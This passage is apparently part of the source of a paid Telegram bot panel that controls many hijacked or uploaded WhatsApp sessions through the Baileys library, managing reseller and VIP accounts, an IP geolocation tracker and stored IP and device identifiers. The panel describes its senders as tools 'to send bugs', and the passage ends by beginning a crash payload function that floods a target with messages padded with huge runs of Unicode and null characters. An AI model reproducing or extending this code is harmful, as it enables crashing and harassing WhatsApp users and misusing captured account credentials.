      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now();
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.onText(/^\/?refresh/, async (msg) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  await refreshUserSessions();
  await bot.sendMessage(chatId, "⚠️ Server Is Refreshing wait for 30-60 Seconds.");
});

bot.onText(/^\/?globalsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "lu ngapain");
  }

  const connectedBiz = Object.keys(biz);
  const connectedMess = Object.keys(mess);
  const connectedNumbers = Object.keys(activeConnections);

  let message = `📌 Global Session\n\n`;

  message += 'Messenger Session:\n';
  message += connectedMess.length > 0
    ? connectedMess.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nBusiness Session:\n';
  message += connectedBiz.length > 0
    ? connectedBiz.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nActive Numbers:\n';
  message += connectedNumbers.length > 0
    ? connectedNumbers.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  bot.sendMessage(chatId, message);
});

// ============================================================
// 📡 /ceksender — Publik, bisa dipakai siapa saja di grup
// ============================================================
bot.onText(/^\/?ceksender$/, (msg) => {
  const chatId = msg.chat.id;

  const senders = loadGlobalSenders();

  if (!senders.length) {
    return bot.sendMessage(chatId,
      "📡 *Global Sender*\n\n❌ Belum ada sender global yang terdaftar.\n\n*Catatan:* Tidak ada batasan jumlah global sender, kamu bisa menambah sebanyak yang kamu mau!",
      { parse_mode: "Markdown" }
    );
  }

  const lines = senders.map((s, i) => {
    const isActive = !!globalConnections[s.number];
    const status = isActive ? "🟢 Online" : "🔴 Offline";
    return `${i + 1}. \`${censorNumber(s.number)}\` — ${status}`;
  });

  const activeCount = Object.keys(globalConnections).length;

  const message = [
    `📡 *Global Sender List*`,
    ``,
    lines.join('\n'),
    ``,
    `✅ Aktif: *${activeCount}/${senders.length}*`,
    `📊 Total Sender: *${senders.length}* (Tidak Ada Batasan)`,
    `_Sender global dapat digunakan oleh VIP & Owner_`
  ].join('\n');

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
// ============================================================

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const chatId = query.message?.chat?.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun member dibuat:\n👤 Username: ${username}\n🔐 Password: ${password}`);
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*\n${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:\n👤 Username: ${username}`);
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;

    // ============================================================
    // 🌐 ADD GLOBAL SENDER — Flow pairing via Telegram (TANPA BATAS)
    // ============================================================
    case "add_global_sender":
      if (!isOwner) {
        return bot.answerCallbackQuery(query.id, { text: "❌ Hanya owner yang bisa menambah global sender.", show_alert: true });
      }

      bot.answerCallbackQuery(query.id);
      bot.sendMessage(id,
        "📱 *Tambah Global Sender*\n\nMasukkan nomor WhatsApp yang akan dijadikan sender global.\n\nFormat: `628xxxxxxxxxx` (tanpa + atau spasi)\n\n*Catatan:* Tidak ada batasan jumlah sender global. Kamu bisa menambah sebanyak yang kamu mau!",
        { parse_mode: "Markdown" }
      );

      bot.once("message", async (msg2) => {
        const rawNumber = (msg2.text || "").replace(/\D/g, "").trim();

        if (!rawNumber || rawNumber.length < 8) {
          return bot.sendMessage(id, "❌ Nomor tidak valid. Masukkan nomor lengkap dengan kode negara (contoh: 628123456789).");
        }

        // Cek apakah sudah terdaftar
        const existing = loadGlobalSenders();
        if (existing.find(s => s.number === rawNumber)) {
          // Coba reconnect jika belum aktif
          if (!globalConnections[rawNumber]) {
            bot.sendMessage(id, `⚠️ Nomor *${censorNumber(rawNumber)}* sudah terdaftar tapi offline. Mencoba reconnect...`, { parse_mode: "Markdown" });
            await pairingGlobalWa(rawNumber);
            return;
          }
          return bot.sendMessage(id, `⚠️ Nomor *${censorNumber(rawNumber)}* sudah terdaftar dan aktif.`, { parse_mode: "Markdown" });
        }

        bot.sendMessage(id, `⏳ Generating pairing code untuk *${censorNumber(rawNumber)}*...`, { parse_mode: "Markdown" });

        try {
          const globalFolder = path.join('permenmd', 'global');
          const sessionDir = path.join(globalFolder, rawNumber);

          if (!fs.existsSync(globalFolder)) fs.mkdirSync(globalFolder, { recursive: true });
          if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

          const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
          const { version } = await fetchLatestBaileysVersion();

          const sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
            version,
            defaultQueryTimeoutMs: undefined,
          });

          sock.ev.on("creds.update", saveCreds);

          if (!sock.authState.creds.registered) {
            await waiting(1500);
            let code;
            try {
              code = await sock.requestPairingCode(rawNumber);
            } catch (pairingErr) {
              return bot.sendMessage(id, `❌ Gagal generate pairing code: ${pairingErr.message}`);
            }

            if (!code) {
              return bot.sendMessage(id, "❌ Gagal mendapatkan pairing code. Coba lagi.");
            }

            // Simpan ke globalSenders.json dulu (belum aktif)
            const senders = loadGlobalSenders();
            if (!senders.find(s => s.number === rawNumber)) {
              senders.push({ number: rawNumber, active: false, addedAt: new Date().toISOString() });
              saveGlobalSenders(senders);
            }

            bot.sendMessage(id,
              `✅ *Pairing Code Global Sender*\n\n📱 Nomor: \`${rawNumber}\`\n🔑 Kode: \`${code}\`\n\n_Buka WhatsApp → Setelan → Perangkat Tertaut → Tautkan Perangkat → Masukkan kode di atas_\n\n⏳ Menunggu koneksi...\n\n*Info:* Tidak ada batasan jumlah global sender, kamu bisa menambah sebanyak yang kamu mau!`,
              { parse_mode: "Markdown" }
            );

            // Handle connection events setelah pairing
            sock.ev.on("connection.update", async (update) => {
              const { connection, lastDisconnect } = update;

              if (connection === "open") {
                globalConnections[rawNumber] = sock;

                const senders = loadGlobalSenders();
                const idx = senders.findIndex(s => s.number === rawNumber);
                if (idx !== -1) { senders[idx].active = true; saveGlobalSenders(senders); }

                bot.sendMessage(id,
                  `🟢 *Global Sender Terhubung!*\n\n📱 Nomor: \`${censorNumber(rawNumber)}\`\nStatus: *Online*\n\n✅ Sender ini sekarang bisa digunakan oleh VIP & Owner untuk mengirim bug.\n\n📊 Total Global Sender: ${loadGlobalSenders().length}`,
                  { parse_mode: "Markdown" }
                );

                // Notif ke grup utama
                sendToGroupsUtama(`🌐 *Global Sender Baru*\nNomor: \`${censorNumber(rawNumber)}\`\nStatus: 🟢 Online\nTotal Global Sender: ${loadGlobalSenders().length}`, { parse_mode: "Markdown" });

              } else if (connection === "close") {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;
                delete globalConnections[rawNumber];

                if (isLoggedOut) {
                  const senders = loadGlobalSenders().filter(s => s.number !== rawNumber);
                  saveGlobalSenders(senders);
                  bot.sendMessage(id, `🔴 Global sender \`${censorNumber(rawNumber)}\` logout dan dihapus dari list.`, { parse_mode: "Markdown" });
                } else {
                  console.log(`[🌐 GLOBAL] Sender ${rawNumber} disconnected, reconnecting...`);
                  await waiting(5000);
                  await pairingGlobalWa(rawNumber);
                }
              }
            });

          } else {
            // Sudah registered, langsung connect
            bot.sendMessage(id, `⚠️ Nomor *${censorNumber(rawNumber)}* sudah pernah pairing. Menghubungkan...`, { parse_mode: "Markdown" });

            sock.ev.on("connection.update", async (update) => {
              const { connection } = update;
              if (connection === "open") {
                globalConnections[rawNumber] = sock;

                const senders = loadGlobalSenders();
                if (!senders.find(s => s.number === rawNumber)) {
                  senders.push({ number: rawNumber, active: true, addedAt: new Date().toISOString() });
                  saveGlobalSenders(senders);
                } else {
                  const idx = senders.findIndex(s => s.number === rawNumber);
                  senders[idx].active = true;
                  saveGlobalSenders(senders);
                }

                bot.sendMessage(id, `🟢 Global sender *${censorNumber(rawNumber)}* berhasil terhubung!`, { parse_mode: "Markdown" });
              }
            });
          }

        } catch (err) {
          console.error("[🌐 GLOBAL ADD ERROR]", err);
          bot.sendMessage(id, `❌ Error saat menambah global sender: ${err.message}`);
        }
      });
      break;
    // ============================================================

    // ============================================================
    // ❌ REMOVE GLOBAL SENDER via Telegram
    // ============================================================
    case "remove_global_sender":
      if (!isOwner) {
        return bot.answerCallbackQuery(query.id, { text: "❌ Hanya owner yang bisa menghapus global sender.", show_alert: true });
      }

      bot.answerCallbackQuery(query.id);

      const sendersList = loadGlobalSenders();
      if (!sendersList.length) {
        return bot.sendMessage(id, "❌ Tidak ada sender global yang terdaftar.");
      }

      const senderButtons = sendersList.map((s, i) => {
        const isActive = !!globalConnections[s.number];
        return [{
          text: `${isActive ? '🟢' : '🔴'} ${censorNumber(s.number)}`,
          callback_data: `del_gs_${s.number}`
        }];
      });
      senderButtons.push([{ text: "❌ Batal", callback_data: "cancel_gs_remove" }]);

      bot.sendMessage(id, "🗑 *Pilih sender global yang ingin dihapus:*", {
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: senderButtons }
      });
      break;

    case "cancel_gs_remove":
      bot.answerCallbackQuery(query.id, { text: "Dibatalkan." });
      break;
  }

  // Handle delete specific global sender
  if (data && data.startsWith("del_gs_")) {
    if (!isOwner) {
      return bot.answerCallbackQuery(query.id, { text: "❌ Tidak diizinkan.", show_alert: true });
    }

    const numberToDelete = data.replace("del_gs_", "");

    if (globalConnections[numberToDelete]) {
      try { globalConnections[numberToDelete].ws.close(); } catch (e) { }
      delete globalConnections[numberToDelete];
    }

    const sessionDir = path.join('permenmd', 'global', numberToDelete);
    if (fs.existsSync(sessionDir)) fs.rmSync(sessionDir, { recursive: true, force: true });

    const newSenders = loadGlobalSenders().filter(s => s.number !== numberToDelete);
    saveGlobalSenders(newSenders);

    bot.answerCallbackQuery(query.id, { text: `✅ Sender ${censorNumber(numberToDelete)} dihapus.` });
    bot.sendMessage(id, `✅ Global sender \`${censorNumber(numberToDelete)}\` berhasil dihapus.\n\n📊 Total Global Sender sekarang: ${newSenders.length}`, { parse_mode: "Markdown" });

    sendToGroupsUtama(`🌐 *Global Sender Dihapus*\nNomor: \`${censorNumber(numberToDelete)}\`\nTotal Global Sender: ${newSenders.length}`, { parse_mode: "Markdown" });
  }
});

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

bot.onText(/^\/?status$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

    const pingStart = Date.now();
    await axios.get(`http://localhost:${PORT}/ping`);
    const ping = Date.now() - pingStart;

    const gsActive = countActiveGlobalSenders();
    const gsTotal = loadGlobalSenders().length;

    const text = `*DarkVerse Server Status*\n\n*Server Online* [${new Date().toLocaleTimeString()}]\n*Ping:* ~${ping}ms\n*RAM:* ${ramUsage.toFixed(2)} MB\n*CPU:* ${cpuLoad.toFixed(2)}\n*Uptime:* ${uptime}\n*Total Database:* ${dbLength}\n*Global Sender:* ${gsActive}/${gsTotal} aktif (Tanpa Batas)\n*Server Protect*: *Darkness-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1].trim();
  
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
    return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

  try {
    const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

    if (data.error) {
      return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
    }

    const info = `
*IP Tracker Result*

IP: ${data.ip || ip}
Kota: ${data.city || "-"}
Negara: ${data.country_name || "-"} (${data.country_code || "?"})
Zona Waktu: ${data.timezone || "-"}
ISP: ${data.org || "-"}
Latitude: ${data.latitude || "-"}
Longitude: ${data.longitude || "-"}

Database: ${data.asn || "-"}
    `.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    if (data.latitude && data.longitude) {
      await bot.sendLocation(chatId, data.latitude, data.longitude);
    }

  } catch (err) {
    console.error("❌ Error trackip:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
  }
});

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}
function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
  fs.writeFileSync("reset_result.txt", deleted.join("\n") || "Tidak ada akun dihapus.");

  return deleted;
}

function registerResetButton(cmd, role) {
  bot.onText(new RegExp(`^\\/?(${cmd})$`, "i"), async (msg) => {
    if (msg.from.id !== OWNER_ID) return bot.sendMessage(msg.chat.id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

    const roleName = role === "all" ? "SEMUA AKUN" : `role *${role}*`;
    const opts = {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "✅ Konfirmasi", callback_data: `confirm_${cmd}` }],
          [{ text: "❌ Batal", callback_data: "cancel_reset" }]
        ]
      }
    };
    bot.sendMessage(msg.chat.id, `⚠️ Apakah kamu yakin ingin menghapus ${roleName}?`, opts);
  });

  bot.on("callback_query", async (query) => {
    const data = query.data;
    const fromId = query.from.id;
    const cbChatId = query.message.chat.id;

    if (data === `confirm_${cmd}`) {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }

      const deleted = doReset(role);
      const info = deleted.length > 0 ? `✅ ${deleted.length} akun dihapus.` : "ℹ️ Tidak ada akun yang dihapus.";

      await bot.sendDocument(cbChatId, "reset_result.txt", {
        caption: `*Berhasil menghapus ${deleted.length} akun*\n${role === "all" ? "🗑 Semua akun" : `🗑 Role: ${role}`}`,
        parse_mode: "Markdown"
      });
      return bot.answerCallbackQuery(query.id, { text: info });
    }

    if (data === "cancel_reset") {
      if (fromId !== OWNER_ID) {
        return bot.answerCallbackQuery(query.id, { text: "Ga usah rusuh cil 😎", show_alert: true });
      }
      bot.answerCallbackQuery(query.id, { text: "❌ Dibatalkan." });
      bot.sendMessage(cbChatId, "🚫 Aksi reset dibatalkan.");
    }
  });
}

registerResetButton("resetakunowner", "owner");
registerResetButton("resetakunreseller", "reseller");
registerResetButton("resetakunvip", "vip");
registerResetButton("resetakunmember", "member");
registerResetButton("resetall", "all");

bot.onText(/^\/?info\s+(\S+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const username = match[1].trim().toLowerCase();

  try {
    if (!fs.existsSync("database.json")) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    if (!fs.existsSync("keyList.json")) return bot.sendMessage(chatId, "❌ File keyList.json tidak ditemukan.");

    const db = JSON.parse(fs.readFileSync("database.json"));
    const keys = JSON.parse(fs.readFileSync("keyList.json"));

    const dbUser = db.find(u => (u.username || "").toLowerCase() === username);
    const keyUser = keys.find(k => (k.username || "").toLowerCase() === username);

    if (!dbUser && !keyUser) {
      return bot.sendMessage(chatId, `❌ Akun *${username}* tidak ditemukan.`, { parse_mode: "Markdown" });
    }

    const role = dbUser?.role || "member";
    const expired = dbUser?.expiredDate || "Tidak ada";
    const lastSend = dbUser?.lastSend
      ? new Date(dbUser.lastSend).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum pernah";

    const lastLogin = keyUser?.lastLogin
      ? new Date(keyUser.lastLogin).toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })
      : "Belum login";
    const ip = keyUser?.ipAddress || "Tidak diketahui";
    const android = keyUser?.androidId || "-";
    const session = keyUser?.sessionKey || "-";

    const info = `
*INFORMASI AKUN*

*Username:* ${dbUser?.username || keyUser?.username || username}
*Role:* ${role}
*Expired Date:* ${expired}
*Terakhir Kirim:* ${lastSend}
*Terakhir Login:* ${lastLogin}
*IP Address:* ${ip}
*Android ID:* ${android}
*Session Key:* \`${session}\`
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error info:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mengambil data akun.");
  }
});

const startTime = Date.now();

function getUptime() {
  const seconds = Math.floor((Date.now() - startTime) / 1000);
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = seconds % 60;
  return `${h}j ${m}m ${s}d`;
}

bot.onText(/^\/?(?:stats|status)$/i, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    let users = [];
    if (fs.existsSync("database.json")) {
      users = JSON.parse(fs.readFileSync("database.json"));
    }

    const totalUser = users.length;
    const countRole = (role) => users.filter(u => (u.role || "member") === role).length;

    const owners = countRole("owner");
    const resellers = countRole("reseller");
    const vips = countRole("vip");
    const members = countRole("member");

    const connectedMess = Object.keys(mess || {}).length || 0;
    const connectedBiz = Object.keys(biz || {}).length || 0;
    const connectedNumbers = Object.keys(activeConnections || {}).length || 0;
    const globalActive = countActiveGlobalSenders();
    const globalTotal = loadGlobalSenders().length;

    const info = `
*Bot Statistics*

*Status:* Online
*Uptime:* ${getUptime()}

*User Data*
• Total User: ${totalUser}
• Owner: ${owners}
• Reseller: ${resellers}
• VIP: ${vips}
• Member: ${members}

*WhatsApp Session*
• Messenger: ${connectedMess}
• Business: ${connectedBiz}
• Active Numbers: ${connectedNumbers}

*🌐 Global Sender*
• Aktif: ${globalActive}/${globalTotal}
• *Tanpa Batas* — Bisa tambah sebanyak mungkin!

*Tanggal:* ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
`.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("❌ Error stats:", err);
    bot.sendMessage(chatId, "❌ Gagal mengambil data stats.");
  }
});

bot.onText(/^\/?statususer$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const dbPath = "./database.json";
    const logPath = "logUser.txt";

    if (!fs.existsSync(dbPath)) return bot.sendMessage(chatId, "❌ File database.json tidak ditemukan.");
    const db = JSON.parse(fs.readFileSync(dbPath, "utf-8"));

    if (!fs.existsSync(logPath)) return bot.sendMessage(chatId, "📊 Belum ada data log pembuatan akun.");

    const logs = fs.readFileSync(logPath, "utf-8").split("\n").filter(Boolean);

    const countMap = {};
    for (const line of logs) {
      const match = line.match(/^(\S+)\s+Created\s+/);
      if (match) {
        const creator = match[1];
        countMap[creator] = (countMap[creator] || 0) + 1;
      }
    }

    const list = db.map(u => ({
      username: u.username,
      role: u.role || "member",
      total: countMap[u.username] || 0
    }));

    list.sort((a, b) => b.total - a.total);

    let teks = `📊 STATUS USER & AKTIVITAS BOT\nGenerated: ${new Date().toLocaleString()}\n\n`;
    teks += `Username | Role | Total Akun Dibuat\n`;
    teks += `-------------------------------------\n`;

    for (const u of list) {
      teks += `${u.username} | ${u.role} | ${u.total}\n`;
    }

    const filePath = "./statususer.txt";
    fs.writeFileSync(filePath, teks);

    await bot.sendDocument(chatId, filePath, {
      caption: "📄 Berikut status semua user & jumlah akun yang telah mereka buat."
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error("[❌ STATUSUSER ERROR]", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat laporan status user.");
  }
});

const SESSION_PATH = path.join(__dirname, "permenmd");

bot.onText(/^\/?clearsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder session tidak ditemukan.");
    }

    fs.rmSync(SESSION_PATH, { recursive: true, force: true });
    fs.mkdirSync(SESSION_PATH, { recursive: true });

    bot.sendMessage(chatId, "✅ Semua session dihapus dengan sukses (folder *permenmd* dikosongkan).");
    console.log("🧹 Semua session telah dihapus melalui /clearsession");
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Gagal menghapus semua session.");
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ Folder 'permenmd' tidak ditemukan.");
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      if (userFolder === 'global') continue; // skip global folder
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    bot.sendMessage(chatId, `Berhasil menghapus ${deletedCount} folder session yang tidak berisi file .json.`);
    console.log(`🧹 ${deletedCount} folder session kosong dihapus.`);
  } catch (err) {
    console.error("❌ Error saat clear session:", err);
    bot.sendMessage(chatId, "❌ Terjadi error saat membersihkan session kosong.");
  }
});

bot.onText(/^\/?restart$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  sendToGroupsUtama("🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...", { parse_mode: "Markdown" });
  console.log("♻️ Restart manual dijalankan...");

  setTimeout(() => {
    sendToGroupsUtama("🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!", { parse_mode: "Markdown" });
  }, 8000);

  setTimeout(() => {
    process.exit(0);
  }, 5000);
});

// ===== Start Express Server =====
app.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://localhost:${PORT}`);
  startUserSessions();
  startGlobalSessions(); // 🌐 Start semua global sender tersimpan
});

// ===== AUTO RESTART PANEL =====
const RESTART_INTERVAL = 20 * 60 * 1000;

function kirimStatusServer(pesan) {
  try {
    sendToGroupsUtama(`🟣 *Status Panel:*\n${pesan}`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal kirim status ke Telegram:", err.message);
  }
}

kirimStatusServer("✅ Server aktif dan berjalan normal.");

setInterval(() => {
  kirimStatusServer("♻️ Panel akan *restart otomatis* untuk menjaga kestabilan...");
  console.log("♻️ Auto restarting panel...");
  setTimeout(() => {
    process.exit(0);
  }, 5000);
}, RESTART_INTERVAL);

async function iosTrashLocExtend(sock, target) {
const TrashIosx = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿".repeat(60000); 
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `https://whatsappx-ios.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, 
      }

      let extendMsg = {
         extendedTextMessage: { 
            text: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + TrashIosx, 
            matchedText: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰr4Ldz`impõssible. ✩",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
